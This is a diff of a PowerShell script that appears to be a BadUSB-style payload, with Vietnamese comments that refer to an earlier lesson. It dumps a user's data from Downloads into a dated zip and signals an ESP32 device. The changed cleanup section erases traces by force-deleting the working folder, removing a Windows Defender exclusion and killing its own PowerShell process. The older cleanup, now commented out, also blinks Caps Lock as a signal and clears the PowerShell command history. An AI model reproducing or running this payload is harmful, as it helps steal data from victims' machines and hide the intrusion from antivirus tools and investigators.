@@ -5,7 +5,7 @@
 #  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
 #  |___/                                        
 
-$basePath = "C:\Users\$env:USERNAME\Downloads"
+$basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
@@ -99,27 +99,48 @@ try {
 
 
 
-# Cleanup
+# # Cleanup
+# $fileStream.Close()
+# $fileStream.Dispose()
+
+# Set-Location C:\Users\$env:USERNAME\Downloads
+
+# # ===============================================================================
+# # [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
+# # ===============================================================================
+# Remove-Item -Recurse -Force scripts
+# Remove-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\Downloads" -Force
+# # ===============================================================================
+
+# # Caps Lock signal
+# $keyBoardObject = New-Object -ComObject WScript.Shell
+# for ($i=0; $i -lt 4; $i++) {
+#     $keyBoardObject.SendKeys("{CAPSLOCK}")
+#     Start-Sleep -Seconds 1
+# }
+
+# # Clear command history
+# Clear-Content (Get-PSReadlineOption).HistorySavePath
+
+# exit
+
+# ===============================================================================
+# LỆNH DỌN DẸP SẠCH DẤU VẾT (AN TOÀN)
+# ===============================================================================
+# 1. Đóng các luồng file để không bị hệ thống khóa
 $fileStream.Close()
 $fileStream.Dispose()
 
-Set-Location C:\Users\$env:USERNAME\Downloads
+# 2. BẮT BUỘC: Nhảy ra ổ C để không bị kẹt trong thư mục sắp xóa
+Set-Location "C:\"
 
-# ===============================================================================
-# [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
-# ===============================================================================
-Remove-Item -Recurse -Force scripts
-Remove-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\Downloads" -Force
-# ===============================================================================
+# 3. Xóa thư mục làm việc (SysCache) và mọi thứ bên trong nó
+Remove-Item -Path $basePath -Recurse -Force
 
-# Caps Lock signal
-$keyBoardObject = New-Object -ComObject WScript.Shell
-for ($i=0; $i -lt 4; $i++) {
-    $keyBoardObject.SendKeys("{CAPSLOCK}")
-    Start-Sleep -Seconds 1
-}
+# 4. Gỡ thư mục này khỏi danh sách bỏ qua của Windows Defender
+Remove-MpPreference -ExclusionPath $basePath -Force
 
-# Clear command history
-Clear-Content (Get-PSReadlineOption).HistorySavePath
-
-exit
+# 5. Gửi tín hiệu DONE qua Serial cho ESP32 (Nếu bạn đã cấu hình ở bài trước)
+# ... 
+# 6. Tự hủy cửa sổ PowerShell
+Stop-Process -Id $PID -Force
